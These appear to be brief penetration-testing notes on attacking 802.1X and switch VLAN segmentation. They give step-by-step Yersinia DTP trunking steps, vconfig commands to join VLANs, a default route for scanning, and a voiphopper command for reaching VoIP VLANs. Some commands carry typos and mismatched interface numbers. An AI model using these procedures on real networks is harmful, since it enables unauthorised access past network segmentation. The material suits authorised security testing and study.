802.1x Attacks
-------------------

Only after authentication through EAP you receive access to network. 

1. Fuzz EAP server as switch is agnostic to it 
2. Brute Force
3. Social Engineering 


POST Authentication 
1. Shadow device by cloning MAC 
2. VLAN Hop 


Linux OS only supports truking, windows doesnt recognize trunking packets. 
VLAN hopping done by manipulating 802.1q packets, if detected switch will send VLAN infomration to our device through DTP. 

DTP is proprietary to CISCO switches. Juniper has similar attacks. 

Tool: 
Yersinia 
sudo apt install yersinia  

Step 1. Yersinia -I -> g -> DTP -> x -> 1 
Step 2. If attack successful -> 5 (status dialog) -> "84 TRUNK/AUTO" (successful)
Step 3. Press g -> select protocol mode -> 802.1q -> enter 
Yersinia shows VLAN List 

VLAN Participation : 
modrpobe 8021q
vconfig add eth0 101
ifconfig eth0.100 
vconfig rem eth0.100 (removes) 

add route : route add -net 0.0.0.0/0 eth0.100 
proceed to scan 

also bruteforce VLAN with vconfig, dhclient (bash script) 
Also to access VoIP VLAN - through Cisco Discovery Protocols 
voiphopper -c 0 -i eth0
